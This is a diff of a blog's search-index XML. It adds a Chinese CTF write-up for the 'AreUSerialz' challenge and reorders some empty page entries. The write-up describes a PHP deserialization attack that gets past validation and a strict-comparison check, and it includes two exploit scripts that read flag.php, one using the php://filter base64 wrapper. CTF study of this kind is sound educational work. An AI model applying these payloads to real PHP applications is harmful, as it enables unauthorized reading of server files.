@@ -4,6 +4,39 @@
   
     
     <entry>
+      <title>网鼎杯 2020 青龙组-AreUSerialz1</title>
+      <link href="/2022/02/10/AreUSerialz/"/>
+      <url>/2022/02/10/AreUSerialz/</url>
+      
+        <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>通过查看源代码，如果想要获得flag，我们需要做以下几件事：</p><ol><li>更改<code>protected</code>变量的值</li><li>调用read成员函数读取文件</li><li>修改读取文件为flag文件</li><li>绕过<code>__destruct</code>魔术方法</li><li>绕过<code>is_valid</code>方法</li></ol><p>序列化的大致原理是将类中的属性转换为字符串，方便在web上进行传输，更详细的介绍可以参考这个<a href="https://www.cnblogs.com/youyoui/p/8610068.html">链接</a>。<br>protected属性在序列化时会出现阶段字符，也就是ASCII码中值为0的字符。但是<code>is_valid</code>方法只允许[32,125]范围内的字符，所以我们需要对其进行绕过。<br><code>string(121) &quot;O:11:\&quot;FileHandler\&quot;:3:&#123;s:5:\&quot;\0*\0op\&quot;;i:2;s:11:\&quot;\0*\0filename\&quot;;s:8:\&quot;flag.php\&quot;;s:10:\&quot;\0*\0content\&quot;;s:5:\&quot;hello\&quot;;&#125;&quot;</code>其中<code>\0</code>则为截断字符，正常输出是不会在窗口中显示出来的，需要进行转义。<br>可以采用如下两种方法进行绕过：</p><ul><li>PHP7.1+版本对属性类型不敏感，所以可以使用不存在特殊字符的public属性进行序列化，private属性同样存在截断字符。三者区别可以参考这个<a href="https://blog.csdn.net/Xxy605/article/details/117336343">链接</a>。</li><li>将小写的s类型变为大写的S，表示可以在字符串中用十六进制格式表示字符。我们便可以将截断字符表示为<code>\00</code>，需要注意的是字符串长度不变，也就是这三个字符代表一个截断字符。</li></ul><p>上面我们可以对属性进行赋值了，接下来要做的是绕过__destruct。__destruct中为强类型比较，也就是在比较数值前会先比较数据类型，如果数据类型不相等则为false。但是在<code>process</code>方法中为弱类型比较，如果等号两边数据类型不同，则右边的数据类型会转变为左边的数据类型。<br>这样我们可以将op变量赋值为整数型数值2，这样便不会进入__destruct的条件中。</p><h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line">    <span class="keyword">echo</span>(serialize(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:5:&quot;Hello&quot;;&#125;</code><br>使用上面的exp后，可以在网页的源代码中找到flag，因为输出的内容为php代码，所以浏览器不会显示在页面中。如果想要显示在页面中，可以使用php伪协议进行base64编码后输出。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$op</span> = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;Hello&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$c</span> = <span class="keyword">new</span> FileHandler();</span><br><span class="line">    <span class="keyword">echo</span>(serialize(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF </category>
+          
+          <category> web </category>
+          
+          <category> 小比赛 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> php反序列化 </tag>
+            
+            <tag> php伪协议 </tag>
+            
+            <tag> php强类型比较 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>CISCN-HackWorld</title>
       <link href="/2022/02/08/World/"/>
       <url>/2022/02/08/World/</url>
@@ -150,6 +183,17 @@
     
     
     <entry>
+      <title>分类</title>
+      <link href="/categories/index.html"/>
+      <url>/categories/index.html</url>
+      
+        <content type="html"><![CDATA[]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>about</title>
       <link href="/about/index.html"/>
       <url>/about/index.html</url>
@@ -161,9 +205,9 @@
     
     
     <entry>
-      <title>分类</title>
-      <link href="/categories/index.html"/>
-      <url>/categories/index.html</url>
+      <title>movies</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -183,17 +227,6 @@
     
     
     <entry>
-      <title>友情链接</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
-      
-        <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
       <title>music</title>
       <link href="/music/index.html"/>
       <url>/music/index.html</url>
@@ -205,9 +238,9 @@
     
     
     <entry>
-      <title>标签</title>
-      <link href="/tags/index.html"/>
-      <url>/tags/index.html</url>
+      <title>友情链接</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -216,9 +249,9 @@
     
     
     <entry>
-      <title>movies</title>
-      <link href="/movies/index.html"/>
-      <url>/movies/index.html</url>
+      <title>标签</title>
+      <link href="/tags/index.html"/>
+      <url>/tags/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
